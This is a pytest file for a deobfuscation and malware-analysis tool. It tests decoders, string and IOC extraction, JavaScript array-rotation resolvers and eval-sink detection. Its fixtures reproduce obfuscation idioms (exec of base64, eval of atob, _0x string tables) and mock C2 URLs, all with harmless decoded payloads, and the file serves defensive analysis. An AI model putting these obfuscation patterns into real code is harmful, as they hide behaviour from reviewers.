"""
Tests for Unweaver transform modules: Base64Decoder, HexDecoder, and
StringExtractor.

Covers decoding accuracy, language-specific extraction, constant folding
patterns (String.fromCharCode, chr()), language detection heuristics, IOC
extraction, and readability scoring.
"""

from __future__ import annotations

import ast
import base64
import io
import shutil
import zipfile
from unittest.mock import patch

import pytest

import app.services.transforms.javascript_bundle_deobfuscator as javascript_bundle_deobfuscator_module
from app.services.ingest.workspace_bundle import scan_workspace_archive
from tests.dotnet_test_utils import (
    build_resx,
    build_test_dotnet_assembly,
    build_test_dotnet_assembly_with_resources,
)
from app.services.transforms.base import TransformResult
from app.services.transforms.base64_decoder import (
    Base64Decoder,
    _is_plausible_b64,
    _try_decode,
)
from app.services.transforms.constant_folder import ConstantFolder
from app.services.transforms.deterministic_renamer import DeterministicRenamer
from app.services.transforms.dotnet_assembly_analyzer import DotNetAssemblyAnalyzer
from app.services.transforms.hex_decoder import (
    HexDecoder,
    _decode_backslash_x,
    _decode_0x_list,
    _decode_unicode_escape,
    _decode_percent_hex,
    _decode_hex_stream,
)
from app.services.transforms.eval_detection import EvalExecDetector
from app.services.transforms.javascript_bundle_deobfuscator import JavaScriptBundleDeobfuscator
from app.services.transforms.javascript_encoder_decoder import JavaScriptEncoderDecoder
from app.services.transforms.js_packer_unpacker import JavaScriptPackerUnpacker
from app.services.transforms.js_resolvers import JavaScriptArrayResolver
from app.services.transforms.language_detector import LanguageDetector
from app.services.transforms.powershell_decoder import PowerShellDecoder
from app.services.transforms.python_decoder import PythonDecoder
from app.services.transforms.python_serialization_decoder import PythonSerializationDecoder
from app.services.transforms.source_preprocessor import SourcePreprocessor
from app.services.transforms.string_decryptor import StringDecryptor
from app.services.transforms.string_extraction import (
    StringExtractor,
    _strip_quotes,
    _flag_string,
)
from app.services.transforms.workspace_file_deobfuscator import WorkspaceFileDeobfuscator
from app.services.transforms.workspace_profiler import WorkspaceProfiler
from app.services.transforms.xor_recovery import XorRecovery
from app.services.analysis.state_manager import StateManager


# ════════════════════════════════════════════════════════════════════════
#  Base64 Decoder
# ════════════════════════════════════════════════════════════════════════

class TestBase64Decoder:
    """Tests for the Base64Decoder transform."""

    def setup_method(self):
        self.decoder = Base64Decoder()

    def test_decode_known_js_atob(self):
        """atob('aGVsbG8gd29ybGQ=') should decode to 'hello world'."""
        code = 'var x = atob("aGVsbG8gd29ybGQ=");'
        state: dict = {}
        assert self.decoder.can_apply(code, "javascript", state)
        result = self.decoder.apply(code, "javascript", state)
        assert result.success is True
        assert "hello world" in result.output
        assert result.confidence > 0.5
        assert result.details["decoded_count"] >= 1

    def test_decode_python_b64decode(self):
        """base64.b64decode('cHJpbnQoImhlbGxvIik=') should decode."""
        code = "exec(base64.b64decode('cHJpbnQoImhlbGxvIik='))"
        state: dict = {}
        assert self.decoder.can_apply(code, "python", state)
        result = self.decoder.apply(code, "python", state)
        assert result.success is True
        assert 'print("hello")' in result.output

    def test_decode_powershell_convert(self):
        """[System.Convert]::FromBase64String('aGVsbG8=') should decode."""
        code = "[System.Convert]::FromBase64String('aGVsbG8=')"
        state: dict = {}
        assert self.decoder.can_apply(code, "powershell", state)
        result = self.decoder.apply(code, "powershell", state)
        assert result.success is True
        assert "hello" in result.output

    def test_decode_csharp_convert(self):
        """Convert.FromBase64String("aGVsbG8=") should decode."""
        code = 'Convert.FromBase64String("aGVsbG8=")'
        state: dict = {}
        assert self.decoder.can_apply(code, "csharp", state)
        result = self.decoder.apply(code, "csharp", state)
        assert result.success is True
        assert "hello" in result.output

    def test_nested_base64_decoding(self):
        """Double-encoded base64 should be decoded through both layers."""
        inner = base64.b64encode(b"secret_payload").decode()
        outer = base64.b64encode(inner.encode()).decode()
        code = f'atob("{outer}")'
        state: dict = {}
        result = self.decoder.apply(code, "javascript", state)
        assert result.success is True
        # Should have decoded through at least one layer
        assert result.details["max_nesting"] >= 1

    def test_no_base64_returns_failure(self):
        """Code without base64 should return success=False."""
        code = "var x = 42; console.log(x);"
        state: dict = {}
        assert not self.decoder.can_apply(code, "javascript", state)
        result = self.decoder.apply(code, "javascript", state)
        assert result.success is False
        assert result.confidence == 0.0

    def test_standalone_blob_detection(self):
        """A standalone base64 blob (no wrapper) should be detected."""
        payload = base64.b64encode(b"http://example.com/malware").decode()
        code = f"var cfg = '{payload}';"
        state: dict = {}
        assert self.decoder.can_apply(code, "javascript", state)
        result = self.decoder.apply(code, "javascript", state)
        assert result.success is True
        assert "example.com" in result.output

    def test_state_is_populated(self):
        """Decoded items should be stored in the shared state dict."""
        code = 'atob("dGVzdA==")'
        state: dict = {}
        self.decoder.apply(code, "javascript", state)
        assert "decoded_base64" in state
        assert len(state["decoded_base64"]) >= 1
        assert state["decoded_base64"][0]["decoded"] == "test"

    def test_is_plausible_b64_valid(self):
        """Valid base64 strings should pass the plausibility check."""
        assert _is_plausible_b64("aGVsbG8gd29ybGQ=")
        assert _is_plausible_b64("YWJjZGVmZw==")

    def test_is_plausible_b64_invalid(self):
        """Short or malformed strings should fail."""
        assert not _is_plausible_b64("abc")
        assert not _is_plausible_b64("!!!!")

    def test_try_decode_valid(self):
        """_try_decode should return decoded text for valid input."""
        result = _try_decode("aGVsbG8=")
        assert result == "hello"

    def test_try_decode_invalid(self):
        """_try_decode should return None for garbage input."""
        result = _try_decode("!!!not-base64!!!")
        assert result is None


# ════════════════════════════════════════════════════════════════════════
#  Hex Decoder
# ════════════════════════════════════════════════════════════════════════

class TestHexDecoder:
    """Tests for the HexDecoder transform."""

    def setup_method(self):
        self.decoder = HexDecoder()

    def test_backslash_x_sequence(self):
        r"""\\x68\\x65\\x6c\\x6c\\x6f should decode to 'hello'."""
        code = r'var s = "\x68\x65\x6c\x6c\x6f";'
        state: dict = {}
        assert self.decoder.can_apply(code, "javascript", state)
        result = self.decoder.apply(code, "javascript", state)
        assert result.success is True
        assert "hello" in result.output

    def test_0x_comma_list(self):
        """0x68,0x65,0x6c,0x6c,0x6f should decode to 'hello'."""
        code = "var bytes = [0x68,0x65,0x6c,0x6c,0x6f];"
        state: dict = {}
        assert self.decoder.can_apply(code, "javascript", state)
        result = self.decoder.apply(code, "javascript", state)
        assert result.success is True
        assert "hello" in result.output

    def test_unicode_escape(self):
        r"""\\u0068\\u0065\\u006c\\u006c\\u006f should decode to 'hello'."""
        code = r'var s = "\u0068\u0065\u006c\u006c\u006f";'
        state: dict = {}
        assert self.decoder.can_apply(code, "javascript", state)
        result = self.decoder.apply(code, "javascript", state)
        assert result.success is True
        assert "hello" in result.output

    def test_percent_hex(self):
        """%68%65%6c%6c%6f should decode to 'hello'."""
        code = 'var url = "%68%65%6c%6c%6f";'
        state: dict = {}
        assert self.decoder.can_apply(code, "javascript", state)
        result = self.decoder.apply(code, "javascript", state)
        assert result.success is True
        assert "hello" in result.output

    def test_no_hex_returns_failure(self):
        """Plain code without hex should return success=False."""
        code = "var x = 42;"
        state: dict = {}
        assert not self.decoder.can_apply(code, "javascript", state)

    def test_state_is_populated(self):
        """Decoded hex items should be stored in state."""
        code = r'"\x74\x65\x73\x74"'
        state: dict = {}
        result = self.decoder.apply(code, "javascript", state)
        if result.success:
            assert "decoded_hex" in state
            assert len(state["decoded_hex"]) >= 1

    def test_decode_backslash_x_helper(self):
        result = _decode_backslash_x(r"\x48\x49")
        assert result == "HI"

    def test_decode_0x_list_helper(self):
        result = _decode_0x_list("0x48,0x49")
        assert result == "HI"

    def test_decode_unicode_escape_helper(self):
        result = _decode_unicode_escape(r"\u0048\u0049")
        assert result == "HI"

    def test_decode_percent_hex_helper(self):
        result = _decode_percent_hex("%48%49")
        assert result == "HI"

    def test_decode_hex_stream_helper(self):
        result = _decode_hex_stream("4849")
        assert result == "HI"

    def test_decode_hex_stream_odd_length(self):
        """Odd-length hex stream should return None."""
        result = _decode_hex_stream("484")
        assert result is None


# ════════════════════════════════════════════════════════════════════════
#  String Extraction
# ════════════════════════════════════════════════════════════════════════

class TestStringExtractor:
    """Tests for the StringExtractor transform."""

    def setup_method(self):
        self.extractor = StringExtractor()

    def test_extract_js_strings(self):
        """Should extract both single and double quoted strings from JS."""
        code = '''var a = "hello"; var b = 'world'; var c = `template`;'''
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        assert result.success is True
        values = [s["value"] for s in result.details["strings"]]
        assert "hello" in values
        assert "world" in values
        assert "template" in values

    def test_extract_python_strings(self):
        """Should extract Python string literals including prefixed strings."""
        code = '''x = "hello"; y = 'world'; z = b"bytes"'''
        state: dict = {}
        result = self.extractor.apply(code, "python", state)
        assert result.success is True
        values = [s["value"] for s in result.details["strings"]]
        assert "hello" in values
        assert "world" in values

    def test_extract_powershell_strings(self):
        """Should extract PowerShell strings."""
        code = '''$a = "hello"; $b = 'world'  '''
        state: dict = {}
        result = self.extractor.apply(code, "powershell", state)
        assert result.success is True
        values = [s["value"] for s in result.details["strings"]]
        assert "hello" in values
        assert "world" in values

    def test_extract_csharp_strings(self):
        """Should extract C# string literals."""
        code = 'string s = "hello"; string v = @"verbatim";'
        state: dict = {}
        result = self.extractor.apply(code, "csharp", state)
        assert result.success is True
        values = [s["value"] for s in result.details["strings"]]
        assert "hello" in values

    def test_flag_url(self):
        """URLs inside strings should be flagged as suspicious."""
        code = 'var url = "http://evil.com/payload";'
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        suspicious = [s for s in result.details["strings"] if "url" in s["flags"]]
        assert len(suspicious) >= 1

    def test_flag_ip_address(self):
        """IP addresses should be flagged."""
        code = 'var ip = "192.168.1.1";'
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        suspicious = [s for s in result.details["strings"] if "ip_v4" in s["flags"]]
        assert len(suspicious) >= 1

    def test_flag_windows_path(self):
        """Windows paths should be flagged."""
        code = r'var p = "C:\\Windows\\System32\\cmd.exe";'
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        flagged = [s for s in result.details["strings"] if s["flags"]]
        assert len(flagged) >= 1

    def test_flag_registry_key(self):
        """Registry keys should be flagged."""
        code = r'var k = "HKLM\\Software\\Microsoft\\Windows";'
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        flagged = [s for s in result.details["strings"] if "registry_key" in s["flags"]]
        assert len(flagged) >= 1

    def test_flag_sha256_hash(self):
        """SHA256 hashes should be flagged."""
        h = "a" * 64
        code = f'var hash = "{h}";'
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        flagged = [s for s in result.details["strings"] if "hash_sha256" in s["flags"]]
        assert len(flagged) >= 1

    def test_flag_md5_hash(self):
        """MD5 hashes should be flagged."""
        h = "d" * 32
        code = f'var hash = "{h}";'
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        flagged = [s for s in result.details["strings"] if "hash_md5" in s["flags"]]
        assert len(flagged) >= 1

    def test_empty_code(self):
        """Empty code should not be applicable."""
        assert not self.extractor.can_apply("", "javascript", {})
        assert not self.extractor.can_apply("   ", "javascript", {})

    def test_generic_fallback(self):
        """Unknown language should fall back to generic patterns."""
        code = 'var x = "hello";'
        state: dict = {}
        result = self.extractor.apply(code, "unknown_lang", state)
        assert result.success is True
        values = [s["value"] for s in result.details["strings"]]
        assert "hello" in values

    def test_strip_quotes_double(self):
        assert _strip_quotes('"hello"') == "hello"

    def test_strip_quotes_single(self):
        assert _strip_quotes("'hello'") == "hello"

    def test_strip_quotes_backtick(self):
        assert _strip_quotes("`template`") == "template"

    def test_strip_quotes_triple_double(self):
        assert _strip_quotes('"""multi"""') == "multi"

    def test_strip_quotes_fstring(self):
        assert _strip_quotes('f"formatted"') == "formatted"

    def test_strip_quotes_bytestring(self):
        assert _strip_quotes('b"bytes"') == "bytes"

    def test_flag_string_url(self):
        flags = _flag_string("http://example.com/path")
        assert "url" in flags

    def test_flag_string_email(self):
        flags = _flag_string("user@example.com")
        assert "email" in flags

    def test_flag_string_clean(self):
        flags = _flag_string("just a normal string")
        assert len(flags) == 0


# ════════════════════════════════════════════════════════════════════════
#  Constant Folding patterns (String.fromCharCode / chr)
# ════════════════════════════════════════════════════════════════════════

class TestConstantFolding:
    """Test that code using chr() or String.fromCharCode() can be analyzed."""

    def test_js_fromcharcode_produces_string(self):
        """String.fromCharCode sequences should be extractable as strings."""
        # Build the char codes for 'hello'
        codes = ",".join(str(ord(c)) for c in "hello")
        code = f"var s = String.fromCharCode({codes});"
        extractor = StringExtractor()
        state: dict = {}
        result = extractor.apply(code, "javascript", state)
        # The extractor finds string literals; the char codes are in the raw code
        assert result.success is True

    def test_python_chr_list_produces_string(self):
        """chr() list joins should be present in extracted code."""
        code = "''.join([chr(x) for x in [104, 101, 108, 108, 111]])"
        extractor = StringExtractor()
        state: dict = {}
        result = extractor.apply(code, "python", state)
        assert result.success is True

    def test_constant_folder_preserves_embedded_quotes(self):
        folder = ConstantFolder()
        code = """eval('console' + '.' + 'log' + '(' + '"loaded"' + ')');"""

        result = folder.apply(code, "javascript", {})

        assert result.success is True
        assert """eval('console.log("loaded")');""" in result.output


# ════════════════════════════════════════════════════════════════════════
#  Source Preprocessing / Beautification
# ════════════════════════════════════════════════════════════════════════

class TestSourcePreprocessor:
    def setup_method(self):
        self.preprocessor = SourcePreprocessor()

    def test_beautifies_likely_minified_javascript(self):
        code = (
            "function run(){const alpha=1;const beta=2;const gamma=3;const delta=4;"
            "return alpha+beta+gamma+delta;}function beacon(){const url='https://a.test';"
            "return fetch(url).then(r=>r.text());}"
        )

        result = self.preprocessor.apply(code, "javascript", {})

        assert result.success is True
        assert "\n" in result.output
        assert "minified_code_beautification" in result.details["detected_techniques"]

    def test_normalizes_anomalous_whitespace_without_touching_strings(self):
        code = "const\u200b flag\u00a0=\u00a0false;\nconsole.log('x\u200by');"

        result = self.preprocessor.apply(code, "javascript", {})

        assert result.success is True
        assert "const flag = false;" in result.output
        assert "'x\u200by'" in result.output
        assert "source_anomaly_normalization" in result.details["detected_techniques"]

    def test_beautifies_parseable_minified_python_only_when_layout_is_bad(self):
        code = (
            "def run(): a='alpha'; b='beta'; c='gamma'; d='delta'; "
            "payload=a+b+c+d; return payload\n"
        )

        result = self.preprocessor.apply(code, "python", {})

        assert result.success is True
        assert "def run():" in result.output
        assert "payload = a + b + c + d" in result.output
        assert result.details["preprocessing"]["beautifier"] == "python_black"

    def test_black_preserves_python_comments_when_beautifying(self):
        code = (
            "def run():  # keep this note\n"
            "    alpha='a'; beta='b'; gamma='c'; delta='d'; epsilon='e'; zeta='f'; "
            "payload=alpha+beta+gamma+delta+epsilon+zeta; return payload\n"
        )

        result = self.preprocessor.apply(code, "python", {})

        assert result.success is True
        assert "# keep this note" in result.output
        assert "payload = alpha + beta + gamma + delta + epsilon + zeta" in result.output
        assert result.details["preprocessing"]["beautifier"] == "python_black"

    def test_skips_python_beautifier_when_code_is_already_readable(self):
        code = (
            "def run():\n"
            "    payload = 'decoded'\n"
            "    return payload\n"
        )

        assert self.preprocessor.can_apply(code, "python", {}) is False

    def test_skips_binary_dotnet_payloads(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        assembly = build_test_dotnet_assembly(
            """
            namespace Sample;
            public class Loader
            {
                public static string Url => "http://evil.test/a";
            }
            """,
            "BinaryPreprocessTest",
        )
        code = assembly.decode("latin-1")

        assert self.preprocessor.can_apply(code, "", {}) is False


class TestDeterministicRenamer:
    def setup_method(self):
        self.renamer = DeterministicRenamer()

    def test_javascript_renames_string_tables_and_resolvers_readably(self):
        code = (
            "var _0x1a2b=['alpha','beta'];"
            "var _0x5c6d=function(_0x7f0a){return _0x1a2b[_0x7f0a];};"
            "console.log(_0x5c6d(0));"
        )

        result = self.renamer.apply(code, "javascript", {})

        assert result.success is True
        assert "stringTable" in result.output
        assert "resolveString" in result.output
        assert "index" in result.output
        assert result.details["rename_style"] == "jsnice-inspired"
        assert result.details["rename_map"]["_0x1a2b"] == "stringTable"
        assert result.details["rename_map"]["_0x5c6d"] == "resolveString"

# ════════════════════════════════════════════════════════════════════════
#  JavaScript array resolver
# ════════════════════════════════════════════════════════════════════════

class TestJavaScriptArrayResolver:
    def test_folds_deterministic_array_rotation_and_removes_runtime_helper(self):
        resolver = JavaScriptArrayResolver()
        code = (
            'var _0xabc = ["a", "b", "c"];\n'
            "(function(_0xArr,_0xRot){while(--_0xRot)_0xArr.push(_0xArr.shift());})(_0xabc,0x1);\n"
            "console.log(_0xabc[0]);\n"
        )

        result = resolver.apply(code, "javascript", {})

        assert result.success is True
        assert 'var _0xabc = ["b", "c", "a"];' not in result.output
        assert "var _0xabc" not in result.output
        assert "push(_0xArr.shift())" not in result.output
        assert 'console.log("b");' in result.output
        assert "deterministic_array_rotation_fold" in result.details["detected_techniques"]

    def test_resolves_function_expression_wrapper_with_string_indexes(self):
        resolver = JavaScriptArrayResolver()
        code = (
            "var _0x4a2b = ['aHR0cDovL2V4YW1wbGUuY29tL3BheWxvYWQ=', 'bG9jYWxTdG9yYWdl'];\n"
            "var _0xf1 = function(_0x1, _0x2) {\n"
            "    _0x1 = _0x1 - 0x0;\n"
            "    var _0x3 = _0x4a2b[_0x1];\n"
            "    if (_0xf1['initialized'] === undefined) {\n"
            "        _0xf1['initialized'] = true;\n"
            "    }\n"
            "    return _0x3;\n"
            "};\n"
            "var url = atob(_0xf1('0x0'));\n"
            "var storage = _0xf1('0x1');\n"
        )

        result = resolver.apply(code, "javascript", {})

        assert result.success is True
        assert 'var url = atob("aHR0cDovL2V4YW1wbGUuY29tL3BheWxvYWQ=");' in result.output
        assert 'var storage = "bG9jYWxTdG9yYWdl";' in result.output
        assert "_0xf1('0x0')" not in result.output
        assert "_0xf1('0x1')" not in result.output
        assert "wrapper_runtime_removed" in [
            item["type"] for item in result.details["static_rewrites"]
        ]

    def test_removes_unused_array_and_adjacent_rotation_helper_after_inlining(self):
        resolver = JavaScriptArrayResolver()
        code = (
            "var _0x4a2b = ['aHR0cDovL2V4YW1wbGUuY29tL2MycGF5bG9hZA==', 'bG9jYWxTdG9yYWdl'];\n"
            "(function(_0x1a2b3c, _0x4a2b5d) {\n"
            "    var _0x1f3a = function(_0x2d1e4f) {\n"
            "        while (--_0x2d1e4f) {\n"
            "            _0x1a2b3c['push'](_0x1a2b3c['shift']());\n"
            "        }\n"
            "    };\n"
            "    _0x1f3a(++_0x4a2b5d);\n"
            "}(_0x4a2b, 0x1a3));\n"
            "var _0xf1 = function(_0x1) {\n"
            "    var _0x3 = _0x4a2b[_0x1];\n"
            "    return _0x3;\n"
            "};\n"
            "var url = atob(_0xf1('0x0'));\n"
            "var storage = _0xf1('0x1');\n"
        )

        result = resolver.apply(code, "javascript", {})

        assert result.success is True
        assert "var _0x4a2b = [" not in result.output
        assert "_0x1a2b3c['push']" not in result.output
        assert 'var url = atob("aHR0cDovL2V4YW1wbGUuY29tL2MycGF5bG9hZA==");' in result.output
        assert 'var storage = "bG9jYWxTdG9yYWdl";' in result.output
        assert "unused_array_removed" in [
            item["type"] for item in result.details["static_rewrites"]
        ]
        assert "unused_rotation_helper_removed" in [
            item["type"] for item in result.details["static_rewrites"]
        ]

    def test_resolves_nested_rotation_helper_chain(self):
        resolver = JavaScriptArrayResolver()
        code = (
            "var _0xabc = ['c', 'a', 'b'];\n"
            "(function(_0xarr, _0xcount) {\n"
            "    function _0xstep(_0xvalue) {\n"
            "        _0xvalue['push'](_0xvalue['shift']());\n"
            "    }\n"
            "    var _0xrotate = function(_0xloop) {\n"
            "        while (--_0xloop) {\n"
            "            _0xstep(_0xarr);\n"
            "        }\n"
            "    };\n"
            "    _0xrotate(_0xcount);\n"
            "}(_0xabc, 0x2));\n"
            "console.log(_0xabc[0]);\n"
        )

        result = resolver.apply(code, "javascript", {})

        assert result.success is True
        assert 'console.log("b");' in result.output
        assert "_0xstep(_0xarr)" not in result.output
        assert "deterministic_array_rotation_fold" in result.details["detected_techniques"]


class TestJavaScriptBundleDeobfuscator:
    def test_webcrack_reformats_bundle_like_javascript(self):
        transform = JavaScriptBundleDeobfuscator()
        code = (
            "(()=>{var __webpack_modules__={1:(module)=>{module.exports='ok'}};"
            "var __webpack_module_cache__={};"
            "function __webpack_require__(id){"
            "var cached=__webpack_module_cache__[id];"
            "if(cached!==undefined){return cached.exports;}"
            "var module=__webpack_module_cache__[id]={exports:{}};"
            "__webpack_modules__[id](module,module.exports,__webpack_require__);"
            "return module.exports;}"
            "console.log(__webpack_require__(1));})();"
        )

        result = transform.apply(code, "javascript", {})

        assert result.success is True
        assert "\n" in result.output
        assert "function __webpack_require__(id)" in result.output
        assert "javascript_bundle_deobfuscation" in result.details["detected_techniques"]

    def test_materializes_extracted_modules_without_requiring_top_level_rewrite(self):
        transform = JavaScriptBundleDeobfuscator()
        code = "(()=>{console.log(__webpack_require__(1));})();"

        with patch.object(
            javascript_bundle_deobfuscator_module,
            "run_webcrack",
            return_value={
                "ok": True,
                "output": code,
                "bundle": {
                    "type": "webpack",
                    "entryId": "1",
                    "moduleCount": 2,
                    "modules": [
                        {
                            "id": "1",
                            "path": "src/index.js",
                            "isEntry": True,
                            "code": "console.log('entry');\n",
                        },
                        {
                            "id": "2",
                            "path": "src/utils.js",
                            "isEntry": False,
                            "code": "export const value = 1;\n",
                        },
                    ],
                },
                "heuristics": {"bundleLike": True},
            },
        ), patch.object(
            javascript_bundle_deobfuscator_module,
            "validate_javascript_source",
            return_value={"ok": True},
        ):
            result = transform.apply(
                code,
                "javascript",
                {"workspace_file_path": "dist/app.bundle.js"},
            )

        assert result.success is True
        assert result.details["bundle_module_paths"] == [
            "dist/app.bundle.js.__webcrack__/src/index.js",
            "dist/app.bundle.js.__webcrack__/src/utils.js",
        ]
        assert len(result.details["workspace_file_additions"]) == 2
        assert "bundle_module_tree_materialization" in result.details["detected_techniques"]


# ════════════════════════════════════════════════════════════════════════
#  Sink detection metadata
# ════════════════════════════════════════════════════════════════════════

class TestEvalExecDetector:
    def test_emits_identified_sink_metadata(self):
        detector = EvalExecDetector()
        result = detector.apply("eval(payload);", "javascript", {})

        assert result.success is True
        assert result.details["identified_sinks"][0]["family"] == "dynamic_code_execution"
        assert "eval:high" in result.details["suspicious_apis"]

    def test_unwraps_literal_javascript_eval_payload(self):
        detector = EvalExecDetector()
        result = detector.apply("""eval('console.log("loaded")');""", "javascript", {})

        assert result.success is True
        assert result.output == """console.log("loaded");"""
        assert len(result.details["unwrapped_calls"]) == 1


class TestLanguageDetector:
    def test_detects_dotnet_binary_assembly(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        detector = LanguageDetector()
        assembly = build_test_dotnet_assembly(
            """
            namespace Sample;
            public class Loader
            {
                public static void Run() { }
            }
            """,
            "LanguageDetectAssembly",
        )

        result = detector.apply(assembly.decode("latin-1"), "", {})

        assert result.success is True
        assert result.details["detected"] == "dotnet"


# ════════════════════════════════════════════════════════════════════════
#  Language Detection (heuristic via string patterns)
# ════════════════════════════════════════════════════════════════════════

class TestLanguageDetection:
    """Test that the extractor works correctly for each language's patterns."""

    def setup_method(self):
        self.extractor = StringExtractor()

    def test_javascript_patterns_used_for_js(self):
        """'javascript' language should use JS string patterns."""
        code = "var x = `template ${expr}`;"
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        assert result.success is True
        # Template literal should be detected
        assert result.details["total_strings"] >= 1

    def test_python_patterns_used_for_py(self):
        """'python' language should use Python string patterns."""
        code = "x = '''multi\nline'''"
        state: dict = {}
        result = self.extractor.apply(code, "python", state)
        assert result.success is True

    def test_powershell_patterns_used_for_ps(self):
        """'ps1' language alias should use PowerShell patterns."""
        code = "$x = 'literal string'"
        state: dict = {}
        result = self.extractor.apply(code, "ps1", state)
        assert result.success is True

    def test_csharp_patterns_used_for_cs(self):
        """'cs' language alias should use C# patterns."""
        code = 'string s = @"verbatim string";'
        state: dict = {}
        result = self.extractor.apply(code, "cs", state)
        assert result.success is True


# ════════════════════════════════════════════════════════════════════════
#  IOC Extraction via string flags
# ════════════════════════════════════════════════════════════════════════

class TestIOCExtraction:
    """Test that various IOC types are properly flagged during extraction."""

    def setup_method(self):
        self.extractor = StringExtractor()

    def test_extract_url_ioc(self):
        code = 'var c2 = "http://malware.example.com/beacon";'
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        urls = [s for s in result.details["strings"] if "url" in s["flags"]]
        assert len(urls) >= 1
        assert "malware.example.com" in urls[0]["value"]

    def test_extract_defanged_url(self):
        code = 'var c2 = "hxxps://evil.example.com/payload";'
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        defanged = [s for s in result.details["strings"] if "defanged_url" in s["flags"]]
        assert len(defanged) >= 1

    def test_extract_ipv4(self):
        code = 'var ip = "10.0.0.1";'
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        ips = [s for s in result.details["strings"] if "ip_v4" in s["flags"]]
        assert len(ips) >= 1

    def test_extract_sha1_hash(self):
        h = "a" * 40
        code = f'var hash = "{h}";'
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        hashes = [s for s in result.details["strings"] if "hash_sha1" in s["flags"]]
        assert len(hashes) >= 1

    def test_extract_email(self):
        code = 'var contact = "admin@malware.test";'
        state: dict = {}
        result = self.extractor.apply(code, "javascript", state)
        emails = [s for s in result.details["strings"] if "email" in s["flags"]]
        assert len(emails) >= 1


# ════════════════════════════════════════════════════════════════════════
#  Readability Scorer
# ════════════════════════════════════════════════════════════════════════

class TestReadabilityScorer:
    """Test the _estimate_readability heuristic in StateManager."""

    def test_readable_code_scores_high(self):
        code = """
# This function greets the user
def greet_user(username):
    greeting_message = f"Hello, {username}! Welcome."
    print(greeting_message)
    return greeting_message
"""
        score = StateManager._estimate_readability(code)
        assert score > 0.4

    def test_obfuscated_code_scores_low(self):
        code = (
            "var _0x1a2b=_0x3c4d[_0x5e6f(0x1)];_0x7a8b(_0x1a2b,_0x9c0d);"
            "_0x2e3f(_0x4a5b[_0x6c7d(0x2)],_0x8e9f(0x3));"
        )
        score = StateManager._estimate_readability(code)
        assert score < 0.7

    def test_empty_code_scores_zero(self):
        assert StateManager._estimate_readability("") == 0.0
        assert StateManager._estimate_readability("   ") == 0.0

    def test_commented_code_scores_higher(self):
        """Code with comments should score higher than identical code without."""
        base = 'function getData() { return fetch("/api"); }\n'
        with_comments = "// Fetch data from the API endpoint\n" + base
        score_base = StateManager._estimate_readability(base)
        score_comments = StateManager._estimate_readability(with_comments)
        assert score_comments >= score_base

    def test_very_long_lines_penalised(self):
        """A single extremely long line should score lower than formatted code."""
        # Use realistic obfuscated code: many short identifiers chained on one line
        long_line = ";".join([f"_0x{i:04x}=_0x{i+1:04x}+_0x{i+2:04x}" for i in range(0, 150, 3)])
        formatted = "\n".join([
            "function getData() {",
            "  const response = fetch('/api/data');",
            "  return response.json();",
            "}",
        ] * 3)
        score_long = StateManager._estimate_readability(long_line)
        score_formatted = StateManager._estimate_readability(formatted)
        assert score_formatted > score_long


# ════════════════════════════════════════════════════════════════════════
#  TransformResult dataclass
# ════════════════════════════════════════════════════════════════════════

class TestTransformResult:
    """Test the TransformResult dataclass."""

    def test_confidence_clamped_to_range(self):
        r = TransformResult(success=True, output="x", confidence=1.5, description="test")
        assert r.confidence == 1.0

        r2 = TransformResult(success=True, output="x", confidence=-0.5, description="test")
        assert r2.confidence == 0.0

    def test_details_default_empty_dict(self):
        r = TransformResult(success=True, output="x", confidence=0.5, description="test")
        assert r.details == {}

    def test_details_none_becomes_dict(self):
        r = TransformResult(
            success=True, output="x", confidence=0.5, description="test", details=None
        )
        assert r.details == {}


class TestWorkspaceScaleTransforms:
    def test_workspace_archive_scan_cap_keeps_highest_scoring_files(self):
        archive_bytes = io.BytesIO()
        with zipfile.ZipFile(archive_bytes, mode="w") as archive:
            for index in range(5):
                archive.writestr(f"pkg/file{index}.js", "export const ok = 1;\n")
            archive.writestr("pkg/late-suspicious.js", "eval(atob('aGVsbG8='));\n")

        result = scan_workspace_archive(
            filename="repo.zip",
            content_bytes=archive_bytes.getvalue(),
            max_member_bytes=1024 * 1024,
            max_scan_files=5,
        )

        paths = [item.path for item in result.files]
        assert "pkg/late-suspicious.js" in paths
        assert len(paths) == 5

    def test_workspace_archive_keeps_minified_and_bundle_javascript(self):
        archive_bytes = io.BytesIO()
        with zipfile.ZipFile(archive_bytes, mode="w") as archive:
            archive.writestr("web/app.bundle.js", "(()=>{const a=1;return a;})();\n")
            archive.writestr("web/vendor.min.js", "function a(){return 1;}\n")
            archive.writestr("web/readme.txt", "plain text\n")

        result = scan_workspace_archive(
            filename="repo.zip",
            content_bytes=archive_bytes.getvalue(),
            max_member_bytes=1024 * 1024,
            max_scan_files=10,
        )

        paths = [item.path for item in result.files]
        assert "web/app.bundle.js" in paths
        assert "web/vendor.min.js" in paths
        bundle_item = next(item for item in result.files if item.path == "web/app.bundle.js")
        minified_item = next(item for item in result.files if item.path == "web/vendor.min.js")
        assert "bundle" in bundle_item.priority_tags
        assert "minified" in minified_item.priority_tags

    def test_workspace_profiler_indexes_full_archive_when_source_path_is_available(self, tmp_path):
        archive_path = tmp_path / "repo.zip"
        with zipfile.ZipFile(archive_path, mode="w") as archive:
            archive.writestr("src/main.js", "import { decode } from './decode';\nconsole.log(decode('a'));\n")
            archive.writestr("src/decode.js", "export function decode(value){ return eval(value); }\n")
            archive.writestr("package.json", '{"name":"repo"}')

        bundle = (
            "UNWEAVER_WORKSPACE_BUNDLE v1\n"
            "archive_name: repo.zip\n"
            "included_files: 1\n"
            "omitted_files: 2\n"
            "languages: javascript=1\n"
            "entry_points: src/main.js\n"
            "suspicious_files: none\n"
            "manifest_files: none\n"
            "root_dirs: src\n"
            "bundle_note: preserve markers.\n\n"
            '<<<FILE path="src/main.js" language="javascript" priority="entrypoint" size=64>>>\n'
